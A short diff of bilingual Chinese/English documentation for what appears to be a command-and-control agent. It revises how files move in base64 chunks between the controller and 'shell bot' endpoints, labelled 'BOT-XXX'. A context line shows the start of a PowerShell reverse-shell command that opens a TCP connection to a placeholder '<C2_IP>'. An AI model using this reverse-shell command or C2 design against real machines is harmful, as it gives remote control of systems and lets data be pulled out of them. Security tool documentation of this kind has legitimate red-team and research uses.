@@ -270,7 +270,7 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 `read_file` 整文件读取截断 **51200 字符**。
 
 **Shell**：明文单行命令 + `echo __C2AGENT_<hex>__` 定界；C2 探测 OS（`uname` / PowerShell / `sw_vers`）后编号 `BOT-XXX`；
-所有动作转为单条 shell 命令；文件传输走 base64。
+所有动作转为单条 shell 命令；文件传输由 C2 端循环按偏移分段：受控端只执行「读取指定偏移一段并 base64 回传」或「base64 解码并追加到文件」，两端内存有界，大文件不再受单条命令长度限制。
 
 ### 13. 授权、轮数与队列
 
@@ -567,7 +567,8 @@ Whole-file `read_file` is truncated to **51200 chars**.
 
 **Shell**: plaintext single-line command framed by `echo __C2AGENT_<hex>__`; the C2 probes the OS
 (`uname` / PowerShell / `sw_vers`) and assigns `BOT-XXX`; every action becomes one shell command;
-file transfer uses base64.
+file transfer is streamed by the control end in offset-based segments (the shell bot only reads a
+range and base64-encodes it, or base64-decodes and appends a chunk), so both ends stay bounded.
 
 ### 13. Authorization, rounds and the queue
 
